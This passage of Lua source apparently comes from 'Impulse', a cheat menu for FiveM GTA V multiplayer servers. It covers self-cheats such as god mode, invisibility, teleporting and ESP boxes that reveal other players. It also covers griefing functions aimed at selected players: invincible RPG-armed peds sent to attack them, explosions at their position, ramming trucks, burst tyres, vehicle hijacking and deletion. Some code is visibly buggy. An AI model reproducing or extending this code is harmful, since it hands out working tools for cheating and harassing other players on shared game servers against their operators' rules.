                            if GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),false) , -1) == GetPlayerPed(-1)  then
                                if CarSpeed <= 100.0 and CarSpeed >= 30.0 then  
                                    SetVehicleReduceGrip(GetVehiclePedIsIn(GetPlayerPed(-1),false) , true)
                                else
                                    SetVehicleReduceGrip(GetVehiclePedIsIn(GetPlayerPed(-1),false) , false)
                                end
                            end
                            for _,bones in pairs(p_flame_location) do
                                if GetEntityBoneIndexByName(pedVehicle, bones) >= 0 then
                                    UseParticleFxAssetNextCall(p_flame_particle_asset)
                                    local createdPart = StartParticleFxLoopedOnEntityBone(p_flame_particle, NetToVeh(VehToNet(pedVehicle)), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, GetEntityBoneIndexByName(NetToVeh(VehToNet(pedVehicle)), bones), 2.0--[[p_flame_size]], 0.0, 0.0, 0.0)
                                    StopParticleFxLooped(createdPart, 1)
                                end
                            end
                            Wait(0)
                        end
                    end
                
                    Wait(0)
                end
            end)
        else
            SetVehicleReduceGrip(GetVehiclePedIsIn(GetPlayerPed(-1),false) , false)
        end
    end

    function Impulse:RefillCurrent()
        SetPedAmmo(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId(), false), 250)
    end

    function Impulse:Revive()
        TriggerEvent("PlayerSpawned")
        NetworkResurrectLocalPlayer(GetEntityCoords(PlayerPedId(), true), true, true, false)
        SetPlayerInvincible(PlayerPedId(), false)
        ClearPedBloodDamage(PlayerPedId())
        SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()))
        FreezeEntityPosition(PlayerPedId(), false)
        StopScreenEffect('DeathFailOut')
        ClearTimecycleModifier(PlayerPedId())
        StopAllScreenEffects(PlayerPedId())
        ResetPedMovementClipset(PlayerPedId(), 0)
    end

    function Impulse:Suicide()
        SetEntityHealth(PlayerPedId(), 0)
    end
    function Impulse:RefillHealth()
        SetEntityHealth(PlayerPedId(), 200)
    end
    function Impulse:RefillArmor()
        SetPedArmour(PlayerPedId(), 100)
    end

    function Impulse:GodMode()
        Impulse.Options.GodMode = not Impulse.Options.GodMode
        if Impulse.Options.GodMode then
            CreateThread(function()
                while Impulse.Options.GodMode do
                    SetPedSuffersCriticalHits(PlayerPedId(), false)
                    SetEntityProofs(PlayerPedId(), true, true, true, true, true, true, true, true)
                    Wait(0)
                end
            end)
        else
            SetEntityProofs(PlayerPedId(), false, false, false, false, false, false, false, false)
        end
    end

    function Impulse:JumpVehicle()
        Impulse.Options.JumpVehicle = not Impulse.Options.JumpVehicle
        if Impulse.Options.JumpVehicle then
            CreateThread(function()
                while Impulse.Options.JumpVehicle do
                    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1),false)
            
                    if DoesEntityExist(vehicle) and GetPedInVehicleSeat(vehicle, -1) == GetPlayerPed(-1) then
                        if IsControlJustPressed(0, 51) then
                            print("ok")
                            ApplyForceToEntity(vehicle, 1, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, true, true, false, true )
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end
    
    function Impulse:InfiniteRoll()
        Impulse.Options.InfiniteRoll = not Impulse.Options.InfiniteRoll
        if Impulse.Options.InfiniteRoll then
            CreateThread(function()
                while Impulse.Options.InfiniteRoll do
                    if not HasAnimDictLoaded("move_fall") then
                        RequestAnimDict("move_fall")
                        while not HasAnimDictLoaded("move_fall") do
                            Wait(5)
                        end
                    end
                    if IsControlJustPressed(0, 22) then
                        TaskPlayAnim(PlayerPedId(), "move_fall", 'land_roll', 8.0, 9999.0, 1.0, 0, 0, false, false, false)
                        Wait(900)
                        ClearPedTasks(PlayerPedId())
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:FakeLag()
        Impulse.Options.FakeLag = not Impulse.Options.FakeLag
        if Impulse.Options.FakeLag then
            CreateThread(function()
                while Impulse.Options.FakeLag do
                    local coords = GetEntityCoords(PlayerPedId())
                    local x,y,z = table.unpack( GetGameplayCamCoord() + (Impulse.RotationToDirection(GetGameplayCamRot(2)) * 10.0) )
                    local _,_z = GetGroundZFor_3dCoord(x,y,z,0)
                    if _z > z-5.0 then
                        DrawMarker(0, x,y,_z+0.5, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.5, 0.5, 0.5, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 200, false, true, 2, nil, nil, false)
                        if IsControlJustPressed(0, 51) then
                            local heading = GetEntityHeading(PlayerPedId())
                            --local headingcam = GetGameplayCamRelativePitch()
                            SetEntityCoords(PlayerPedId(),x,y,_z)
                            SetEntityHeading(PlayerPedId(),heading)
                            --SetGameplayCamRelativePitch(2*headingcam)
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:HornBoost()
        Impulse.Options.HornBoost = not Impulse.Options.HornBoost
        if Impulse.Options.HornBoost then
            CreateThread(function()
                while Impulse.Options.HornBoost do
                    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1),false)
            
                    if DoesEntityExist(vehicle) and GetPedInVehicleSeat(vehicle, -1) == GetPlayerPed(-1) then
                        if IsControlJustPressed(0, 51) then
                            SetVehicleForwardSpeed(vehicle,200.0)
                        end
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:NoScreenEffects()
        Impulse.Options.NoScreenEffects = not Impulse.Options.NoScreenEffects
        if Impulse.Options.NoScreenEffects then
            CreateThread(function()
                while Impulse.Options.NoScreenEffects do
                    ClearTimecycleModifier(PlayerPedId())
                    StopAllScreenEffects(PlayerPedId())
                    ResetPedMovementClipset(PlayerPedId(), 0)
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:Invisible()
        Impulse.Options.Invisible = not Impulse.Options.Invisible
        if Impulse.Options.Invisible then
            CreateThread(function()
                while Impulse.Options.Invisible do
                    SetEntityVisible(PlayerPedId(), false, false)
                    SetEntityAlpha(PlayerPedId(), 100)
                    Wait(0)
                end
            end)
        else
            SetEntityVisible(PlayerPedId(), true, true)
            SetEntityAlpha(PlayerPedId(), 255)
        end
    end

    function Impulse:InfiniteStamina()
        Impulse.Options.InfiniteStamina = not Impulse.Options.InfiniteStamina
        if Impulse.Options.InfiniteStamina then
            CreateThread(function()
                while Impulse.Options.InfiniteStamina do
                    RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:NoCriticals()
        Impulse.Options.NoCriticals = not Impulse.Options.NoCriticals
        if Impulse.Options.NoCriticals then
            CreateThread(function()
                while Impulse.Options.NoCriticals do
                    SetPedSuffersCriticalHits(PlayerPedId(), false)
                    Wait(0)
                end
            end)
        else
            SetPedSuffersCriticalHits(PlayerPedId(), true)
        end
    end

    function Impulse:NoRagdoll()
        Impulse.Options.NoRagdoll = not Impulse.Options.NoRagdoll
        if Impulse.Options.NoRagdoll then
            CreateThread(function()
                while Impulse.Options.NoRagdoll do
                    SetPedCanRagdoll(PlayerPedId(), false)
                    SetEntityProofs(PlayerPedId(), false, false, false, true, false, false, false, false)
                    Wait(0)
                end
            end)
        else
            SetEntityProofs(PlayerPedId(), false, false, false, false, false, false, false, false)
            SetPedCanRagdoll(PlayerPedId(), true)
        end
    end

    function Impulse:SpeedRun()
        Impulse.Options.SpeedRun = not Impulse.Options.SpeedRun
        if Impulse.Options.SpeedRun then
            CreateThread(function()
                while Impulse.Options.SpeedRun do
                    if IsDisabledControlPressed(0, 21) and not IsPedRagdoll(PlayerPedId()) then
                        local x, y, z = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 30.0, GetEntityVelocity(PlayerPedId())[3]) - GetEntityCoords(PlayerPedId())
        
                        SetEntityVelocity(PlayerPedId(), x, y, z)
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:SpeedSwim()
        Impulse.Options.SpeedSwim = not Impulse.Options.SpeedSwim
        if Impulse.Options.SpeedSwim then
            CreateThread(function()
                while Impulse.Options.SpeedSwim do
                    SetSwimMultiplierForPlayer(PlayerId(), 1.49)
                    Wait(0)
                end
            end)
        else
            SetSwimMultiplierForPlayer(PlayerId(), 1.0)
        end
    end

    function Impulse:SuperJump()
        Impulse.Options.SuperJump = not Impulse.Options.SuperJump
        if Impulse.Options.SuperJump then
            CreateThread(function()
                while Impulse.Options.SuperJump do
                    SetSuperJumpThisFrame(PlayerId())
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:SelectedAllWeapons()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local coords = GetEntityCoords(GetPlayerPed(v))
            
                for i=1, #Impulse.Pickups do
                    CreateAmbientPickup(GetHashKey(Impulse.Pickups[i]),coords,0,250,GetHashKey(Impulse.Pickups[i]),true,true)
                    Wait(50)
                end
                Wait(100)
            end
        end)
    end

    function Impulse:DeleteVehicle()
        CreateThread(function()
            local vehicle = GetVehiclePedIsUsing(GetPlayerPed(-1))
            local attempt = 0
            if Impulse.RequestControlofVehicle(vehicle) then
                if DoesEntityExist(vehicle) then
                    SetEntityAsMissionEntity(vehicle, false, true)
                    DeleteVehicle(vehicle)
                    DeleteEntity(vehicle)
                end
            end
            Wait(100)
        end)
    end

    function Impulse.RequestModelSync(model)
        timeout = timeout or 2500
        local counter = 0
        RequestModel(model)

        while not HasModelLoaded(model) do
            RequestModel(model)
            counter = counter + 100
            Wait(100)
            if counter >= timeout then return false end
        end

        return true
    end

    function Impulse:SpawnMotoCrossTerrain()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerPed(v)
                local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 0.0, 0.0)
                if Impulse.RequestModelSync('xs_combined2_terrain_dystopian_08') then
                    local ent = CreateObject(GetHashKey('xs_combined2_terrain_dystopian_08'), coords.x, coords.y, coords.z, GetEntityHeading(ped), true, true)
                    AttachEntityToEntity(ent, ped, GetPedBoneIndex(ped, 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                    Wait(100)
                end
            end
        end)
    end
	function Impulse:SpawnFootBallGoal()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerPed(v)
                local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 0.0, 0.0)
                if Impulse.RequestModelSync('xs_prop_arena_goal_sf') then
                    local ent = CreateObject(GetHashKey('xs_prop_arena_goal_sf'), coords.x, coords.y, coords.z, GetEntityHeading(ped), true, true)
                    AttachEntityToEntity(ent, ped, GetPedBoneIndex(ped, 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                    Wait(100)
                end
            end
        end)
    end

	function Impulse:SpawnIndustrialBuilding()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerPed(v)
                local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 0.0, 0.0)
                if Impulse.RequestModelSync('xs_combined2_dyst_longbuild_c_09') then
                    local ent = CreateObject(GetHashKey('xs_combined2_dyst_longbuild_c_09'), coords.x, coords.y, coords.z, GetEntityHeading(ped), true, true)
                    AttachEntityToEntity(ent, ped, GetPedBoneIndex(ped, 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                    Wait(100)
                end
            end
        end)
    end

	function Impulse:SpawnMassTrucks()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerPed(v)
                local coords = GetEntityCoords(ped)
                if Impulse.RequestModelSync('hauler2') then
					for i=1,10 do
                    	CreateVehicle(GetHashKey('hauler2'), coords.x, coords.y, coords.z, GetEntityHeading(ped), true, true)
                    	Wait(100)
					end
                end
				Wait(100)
            end
        end)
    end

	function Impulse:SpawnArmedPeds()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local ped = GetPlayerPed(v)
                local coords = GetEntityCoords(ped)
				local ar = "weapon_rpg"
				for as = 1, 8 do
                    if Impulse.RequestModelSync("mp_f_freemode_01") then
                        local at = CreatePed(24,GetHashKey('mp_f_freemode_01'), coords.x+as, coords.y, coords.z, GetEntityHeading(ped), true, true)
                        NetworkRegisterEntityAsNetworked(at)
                        Citizen.CreateThread(
                            function()
                                if DoesEntityExist(at) and not IsEntityDead(GetPlayerPed(v)) then
                                    local au = PedToNet(at)
                                    NetworkSetNetworkIdDynamic(au, false)
                                    SetNetworkIdCanMigrate(au, true)
                                    SetNetworkIdExistsOnAllMachines(au, true)
                                    Citizen.Wait(100.0)
                                    NetToPed(au)
                                    GiveWeaponToPed(at, GetHashKey(ar), 9999, 1, 1)
                                    SetEntityInvincible(at, true)
                                    SetPedCanSwitchWeapon(at, true)
                                    TaskCombatPed(at, GetPlayerPed(v), 0, 16)
                                else
                                    Citizen.Wait(0)
                                end
                            end
                        )
                    end
					Wait(100)
				end
            end
        end)
    end

    function Impulse:RamTruck()
        CreateThread(function()
            if Impulse.RequestModelSync("hauler2") then
                for k,v in pairs(Impulse.SelectedPlayers) do
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(v), 0, -10.0, 0)
                    local vehicle = CreateVehicle("hauler2", offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(v)), true, true)
                    NetworkRegisterEntityAsNetworked(VehToNet(vehicle))
                    SetVehicleForwardSpeed(vehicle, 60.0)
                end
            end
        end)
    end

    function Impulse:Spinner()
        Impulse.Options.Spinner = not Impulse.Options.Spinner
        if Impulse.Options.Spinner then
            CreateThread(function()
                while Impulse.Options.Spinner do
                    SetPedToRagdollWithFall(PlayerPedId(), 1500, 1500, 0, GetEntityForwardVector(PlayerPedId()), 10.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0)
                    Wait(0)
                end
            end)
        else
            ClearPedTasks(PlayerPedId())
        end
    end

    function Impulse:FakeDead()
        Impulse.Options.Spinner = not Impulse.Options.Spinner
        if Impulse.Options.Spinner then
            CreateThread(function()
                while Impulse.Options.Spinner do
                    SetPedToRagdoll(PlayerPedId(), 10000, 10000, 0, 1.0, 0.0, 0.0)
                    Wait(10000)
                end
            end)
        else
            SetEntityCoords(PlayerPedId(),GetEntityCoords(PlayerPedId()))
        end
    end

	function Impulse:SpawnParticles()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local coords = GetEntityCoords(GetPlayerPed(v))

                RequestNamedPtfxAsset("core")
				UseParticleFxAssetNextCall("core")
				StartNetworkedParticleFxNonLoopedAtCoord("veh_respray_smoke", coords, 0.0, 0.0, 0.0, 100.0, false, false, false, false)

                RequestNamedPtfxAsset("scr_agencyheist")
				UseParticleFxAssetNextCall("scr_agencyheist")
				StartNetworkedParticleFxNonLoopedAtCoord("scr_fbi_exp_building", coords, 0.0, 0.0, 0.0, 100.0, false, false, false, false)

                RequestNamedPtfxAsset("scr_rcbarry2")
				UseParticleFxAssetNextCall("scr_rcbarry2")
				StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears", coords, 0.0, 0.0, 0.0, 100.0, false, false, false, false)

                RequestNamedPtfxAsset("scr_exile1")
				UseParticleFxAssetNextCall("scr_exile1")
				StartNetworkedParticleFxNonLoopedAtCoord("scr_ex1_plane_exp_sp", coords, 0.0, 0.0, 0.0, 100.0, false, false, false, false)

                RequestNamedPtfxAsset("scr_exile1")
				UseParticleFxAssetNextCall("scr_exile1")
				StartNetworkedParticleFxNonLoopedAtCoord("scr_ex1_plane_exp_sp", coords, 0.0, 0.0, 0.0, 100.0, false, false, false, false)
                
                Wait(100)
            end
        end)
    end

    function Impulse:SpawnEnnemies()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local coords = GetEntityCoords(GetPlayerPed(v))
                RequestModel("granger")
                RequestModel("mp_f_freemode_01")
                if not HasModelLoaded("granger") then
                    RequestModel("granger")
                    while not HasModelLoaded("granger") do
                        Citizen.Wait(1)
                    end
                end
                if not HasModelLoaded("mp_f_freemode_01") then
                    RequestModel("mp_f_freemode_01")
                    while not HasModelLoaded("mp_f_freemode_01") do
                        Citizen.Wait(1)
                    end
                end
                local vehicle = CreateVehicle(GetHashKey("granger"), coords.x, coords.y, coords.z+10.0, 0.0, true, false)
                local ped = CreatePedInsideVehicle(vehicle, 4, "mp_f_freemode_01", -1, true, false)
                SetVehicleShootAtTarget(ped, GetPlayerPed(v), coords.x, coords.y, coords.z)
                local aq = PedToNet(ped)
                NetworkSetNetworkIdDynamic(aq, false)
                SetNetworkIdCanMigrate(aq, true)
                SetNetworkIdExistsOnAllMachines(aq, true)
                Citizen.Wait(30)
                NetToPed(aq)
                SetEntityInvincible(aq, true)
                SetPedCanSwitchWeapon(ped, true)
                TaskCombatPed(ped, GetPlayerPed(v), 0, 16)
                local ar = "weapon_assaultrifle_mk2"
                for as = 1, 8 do
                    local at = CreatePedInsideVehicle(vehicle, 4, "mp_f_freemode_01", as, true, false)
                    NetworkRegisterEntityAsNetworked(at)
                    Citizen.CreateThread(
                        function()
                            if DoesEntityExist(at) and not IsEntityDead(GetPlayerPed(v)) then
                                local au = PedToNet(at)
                                NetworkSetNetworkIdDynamic(au, false)
                                SetNetworkIdCanMigrate(au, true)
                                SetNetworkIdExistsOnAllMachines(au, true)
                                Citizen.Wait(100.0)
                                NetToPed(au)
                                GiveWeaponToPed(at, GetHashKey(ar), 9999, 1, 1)
                                SetEntityInvincible(at, true)
                                SetPedCanSwitchWeapon(at, true)
                                TaskCombatPed(at, GetPlayerPed(v), 0, 16)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    )
                end
                Wait(100)
            end
        end)
    end

	function Impulse:Teleport()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                SetPedCoordsKeepVehicle(PlayerPedId(),GetEntityCoords(GetPlayerPed(v)))
                Wait(100)
            end
        end)
    end

    function Impulse:Hydrant()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                AddExplosion(GetEntityCoords(GetPlayerPed(v)),13,1.0,1,0,0.1)
                Wait(100)
            end
        end)
    end

    function Impulse:Explode()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                AddExplosion(GetEntityCoords(GetPlayerPed(v)),7,1.0,1,0,0.1)
                Wait(100)
            end
        end)
    end

    function Impulse:Atomize()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local destination = GetPedBoneCoords(GetPlayerPed(v), 0, 0.0, 0.0, 0.0)
                local offset = GetObjectOffsetFromCoords(destination, 0.0, 0.0, 0.0, 0.0)
                ShootSingleBulletBetweenCoords(destination.x, destination.y, destination.z, offset.x,offset.y,offset.z, 1.0, 0, GetHashKey("weapon_raypistol"), PlayerPedId(), true, false, 1)
                Wait(100)
            end
        end)
    end

    function Impulse.RequestControlofVehicle(vehicle)
        NetworkRequestControlOfEntity(vehicle)

        local tick = 0
        while tick <= 10000 do
            NetworkHasControlOfEntity(vehicle)
            if NetworkHasControlOfEntity(vehicle) then
                return true
            end
            tick = tick + 1
            Wait(0)
        end
        return false
    end

    function Impulse:BurstTyres()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local vehicle = GetVehiclePedIsUsing(GetPlayerPed(v))
                if Impulse.RequestControlofVehicle(vehicle) then
                    SetVehicleTyresCanBurst(vehicle,true)
                    local tireID = 0
					for i = 1,10 do
						for tireID = 0, 8 do
							if Impulse.RequestControlofVehicle(vehicle) then
								SetVehicleTyreBurst(vehicle, tireID, true, 1000.0)
							end
						end
					end
                end
                Wait(100)
            end
        end)
    end

    function Impulse:AIJackVehicle()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                if (IsPedInAnyVehicle(GetPlayerPed(v), false)) then
                    local vehicle = GetVehiclePedIsUsing(GetPlayerPed(v))
                    if Impulse.RequestControlofVehicle(vehicle) then
                        ClearPedTasksImmediately(GetPlayerPed(v))
                        Wait(50)
                        local Driver = ClonePed(GetPlayerPed(v), 0.0, true, true)
                        Wait(50)
                        SetPedIntoVehicle(Driver, vehicle, -1)
                        SetPedDiesWhenInjured(Driver, false)
                        TaskSetBlockingOfNonTemporaryEvents(Driver, true)
                        Wait(50)
                        TaskVehicleDriveToCoord(Driver, vehicle, -2000.0, -1000.0, 0.0, 100.0, 1, GetEntityModel(vehicle), 0, 0xC00AB, -1)
                    end
                end
                Wait(100)
            end
        end)
    end

    function Impulse:DeleteAllVehs()
        CreateThread(function()
            for k,v in pairs(Impulse.SelectedPlayers) do
                local vehicle = GetVehiclePedIsUsing(GetPlayerPed(v))
                if Impulse.RequestControlofVehicle(vehicle) then
                    SetVehicleTyresCanBurst(vehicle,true)
					for i = 1,10 do
                        SetEntityAsMissionEntity(vehicle, false, true)
                        DeleteVehicle(vehicle)
                        DeleteEntit(vehicle)
					end
                end
                Wait(100)
            end
        end)
    end

    function Impulse:AntiAFK()
        Impulse.Options.AntiAFK = not Impulse.Options.AntiAFK
        if Impulse.Options.AntiAFK then
            CreateThread(function()
                while Impulse.Options.AntiAFK do
                    local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))

                    TaskGoToCoordAnyMeans(PlayerPedId(), x+math.random(-200,200), y+math.random(-200,200), z,1.0, 0,0, 786603, 0)
                    Wait(10000)
                end
            end)
        else
            ClearPedTasks(PlayerPedId())
        end
    end

    function Impulse:AutoDrive()
        Impulse.Options.AutoDrive = not Impulse.Options.AutoDrive
        if Impulse.Options.AutoDrive then
            CreateThread(function()
                while Impulse.Options.AutoDrive do
                    local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
                    SetNewWaypoint(x+math.random(-200,200),y+math.random(-200,200))
                    local waypointCoords = GetBlipInfoIdCoord(GetFirstBlipInfoId(8))
                    local retval, coords = GetClosestVehicleNode(waypointCoords.x, waypointCoords.y, waypointCoords.z, 1)
                    local veh = GetVehiclePedIsIn(PlayerPedId(), false)

                    TaskVehicleDriveToCoord(PlayerPedId(), veh, coords.x, coords.y, coords.z, 25.0, 1.0, GetHashKey(veh), 786603, 5.0, true)
                    Wait(10000)
                end
            end)
        else
            ClearPedTasks(PlayerPedId())
        end
    end

    function Impulse:Moonwalk()
        Impulse.Options.Moonwalk = not Impulse.Options.Moonwalk
        if Impulse.Options.Moonwalk then
            CreateThread(function()
                while Impulse.Options.Moonwalk do
                    local forwardback = 0
                    if IsDisabledControlPressed(0, 21) and IsDisabledControlPressed(0, 32) then
                        forwardback = -9.8
                    elseif IsPedWalking(PlayerPedId()) then
                        forwardback = -3.6
                    else
                        forwardback = 0.0
                    end
        
                    local x, y, z = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, forwardback, GetEntityVelocity(PlayerPedId())[3]) - GetEntityCoords(PlayerPedId())
        
                    SetEntityVelocity(PlayerPedId(), x, y, z)
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:Shrink()
        Impulse.Options.Shrink = not Impulse.Options.Shrink
        if Impulse.Options.Shrink then
            CreateThread(function()
                while Impulse.Options.Shrink do
                    SetPedConfigFlag(PlayerPedId(), 223, true)
                    Wait(0)
                end
            end)
        else
            SetPedConfigFlag(PlayerPedId(), 223, false)
        end
    end

    function Impulse:ChangeWeather()
        ClearOverrideWeather()
        ClearWeatherTypePersist()
        local newWeather = Impulse.Weathers[math.random(1,#Impulse.Weathers)]
        SetWeatherTypeNow(newWeather)
        SetWeatherTypeNowPersist(newWeather)
    end

    function Impulse:ChangeGraphicsVisuals()
        local newVisual = Impulse.Visuals[math.random(1,#Impulse.Visuals)]
        print(newVisual)
        SetTimecycleModifier(newVisual)
    end

    function Impulse:TeleportToWayPoint()
        local waypointCoords = GetBlipInfoIdCoord(GetFirstBlipInfoId(8))
        local foundGround, zCoords, zPos = false, -500.0, 0.0

        while not foundGround do
            zCoords = zCoords + 10.0
            RequestCollisionAtCoord(waypointCoords.x, waypointCoords.y, zCoords)
            Wait(0)
            foundGround, zPos = GetGroundZFor_3dCoord(waypointCoords.x, waypointCoords.y, zCoords)
            if not foundGround and zCoords >= 2000.0 then
                foundGround = true
            end
        end

        SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords.x, waypointCoords.y, zPos)
    end

    function Impulse:NoNight()
        Impulse.Options.NoNight = not Impulse.Options.NoNight
        if Impulse.Options.NoNight then
            CreateThread(function()
                while Impulse.Options.NoNight do
                    NetworkOverrideClockTime(12,0,0)
                    Wait(1000)
                end
            end)
        end
    end

    function Impulse:RemoveClouds()
        Impulse.Options.RemoveClouds = not Impulse.Options.RemoveClouds
        if Impulse.Options.RemoveClouds then
            CreateThread(function()
                while Impulse.Options.RemoveClouds do
                    ClearOverrideWeather()
                    ClearWeatherTypePersist()
                    SetWeatherTypeNow("EXTRASUNNY")
                    SetWeatherTypeNowPersist("EXTRASUNNY")
                    Wait(1000)
                end
            end)
        end
    end

    function Impulse:NoRain()
        Impulse.Options.NoRain = not Impulse.Options.NoRain
        if Impulse.Options.NoRain then
            SetRainLevel(0.0)
        else
            SetRainLevel(-1)
        end
    end

    function Impulse:NightVision()
        Impulse.Options.NightVision = not Impulse.Options.NightVision
        if Impulse.Options.NightVision then
            SetNightvision(true)
        else
            SetNightvision(false)
        end
    end

    function Impulse:ThermalVision()
        Impulse.Options.ThermalVision = not Impulse.Options.ThermalVision
        if Impulse.Options.ThermalVision then
            SetSeethrough(true)
        else
            SetSeethrough(false)
        end
    end

    function Impulse:Radar()
        Impulse.Options.Radar = not Impulse.Options.Radar
        if Impulse.Options.Radar then
            DisplayRadar(true)
        else
            DisplayRadar(false)
        end
    end

    function Impulse:CrossHair()
        Impulse.Options.CrossHair = not Impulse.Options.CrossHair
        if Impulse.Options.CrossHair then
            CreateThread(function()
                while Impulse.Options.CrossHair do
                    DrawRect(0.5 - 0.001 - 0.005 / 2, 0.5, 0.005, 0.002, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                    DrawRect(0.5 + 0.001 + 0.005 / 2, 0.5, 0.005, 0.002, Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                    DrawRect(0.5, 0.5 - (0.001*GetAspectRatio()) - (0.005*GetAspectRatio()) / 2, 0.002 / GetAspectRatio(), 0.005 * GetAspectRatio(), Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                    DrawRect(0.5, 0.5 + (0.001*GetAspectRatio()) + (0.005*GetAspectRatio()) / 2, 0.002 / GetAspectRatio(), 0.005 * GetAspectRatio(), Impulse.MenuR, Impulse.MenuG, Impulse.MenuB, 255)
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:ESPLines()
        Impulse.Options.ESPLines = not Impulse.Options.ESPLines
        if Impulse.Options.ESPLines then
            CreateThread(function()
                while Impulse.Options.ESPLines do
                    local pedcoords = GetEntityCoords(PlayerPedId())
                    local playerlist = GetActivePlayers()
                    for i = 1, #playerlist do
                        local curplayer = playerlist[i]
                        local curplayerped = GetPlayerPed(curplayer)
                        local PlayerCoords = GetEntityCoords(curplayerped)
                        
                        DrawLine(pedcoords.x, pedcoords.y, pedcoords.z, PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, Impulse.MenuR, Impulse.MenuB, Impulse.MenuB, 255)
                    end
                    Wait(0)
                end
            end)
        end
    end

    function Impulse:ESPBoxes()
        Impulse.Options.ESPBoxes = not Impulse.Options.ESPBoxes
        if Impulse.Options.ESPBoxes then
            CreateThread(function()
                while Impulse.Options.ESPBoxes do
                    local PlayerList = GetActivePlayers()
                    for i = 1, #PlayerList do
                        local curplayerped = GetPlayerPed(PlayerList[i])

                        local bone = GetEntityBoneIndexByName(curplayerped, "SKEL_ROOT")
                        local x,y,z = table.unpack(GetPedBoneCoords(curplayerped, 0, 0.0, 0.0, 0.0))
                        local px,py,pz = table.unpack(GetGameplayCamCoord())

                        if GetDistanceBetweenCoords(x, y, z, px, py, pz, true) < 300.0 then
                            if IsEntityOnScreen(curplayerped) and not IsPedDeadOrDying(curplayerped) then
                                local z = z + 0.9
                                local Distance = GetDistanceBetweenCoords(x, y, z, px, py, pz, true) * 0.002 / 2
                                if Distance < 0.0042 then
                                    Distance = 0.0042
                                end
                            

                                local retval, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)

                                local width = 0.00045
                                local height = 0.00229

                                DrawRect(_x, (_y + height / Distance) - ((_y + height / Distance)-_y) / 2, width / Distance,(_y + height / Distance)-_y, 0, 0, 0, 100) -- middle

                                DrawRect(_x, _y, width / Distance, 0.003, Impulse.MenuR, Impulse.MenuB, Impulse.MenuB, 200) --haut
                                DrawRect(_x, _y + height / Distance, width / Distance, 0.003, Impulse.MenuR, Impulse.MenuB, Impulse.MenuB, 200) --bas
                                DrawRect(_x + width / 2 / Distance, _y + height / 2 / Distance , 0.002, height / Distance, Impulse.MenuR, Impulse.MenuB, Impulse.MenuB, 200) --right
                                DrawRect(_x - width / 2 / Distance, _y + height / 2 / Distance , 0.002, height / Distance, Impulse.MenuR, Impulse.MenuB, Impulse.MenuB, 200) -- left

                                local phealth
                                local parmor

                                if GetEntityHealth(curplayerped) == 0 then
                                    phealth = 2
                                else
                                    phealth = GetEntityHealth(curplayerped)
                                end

                                if GetPedArmour(curplayerped)*2 == 0 then
                                    parmor = 2
                                    phavearmor = false
                                else
                                    parmor = GetPedArmour(curplayerped)*2
                                    phavearmor = true
                                end

                                if phavearmor then

                                    DrawRect(_x - 0.0003 / Distance, _y + height / 2 / Distance, 0.002 / Distance * 0.015, height / Distance, 0, 0, 0, 200) -- health outbound
                                    DrawRect(_x - 0.0003 / Distance, _y + height / Distance - phealth / 175000 / Distance,  0.0012 / Distance * 0.015, (phealth-2) / 87500 / Distance, 0, 255, 0, 200) --health bar

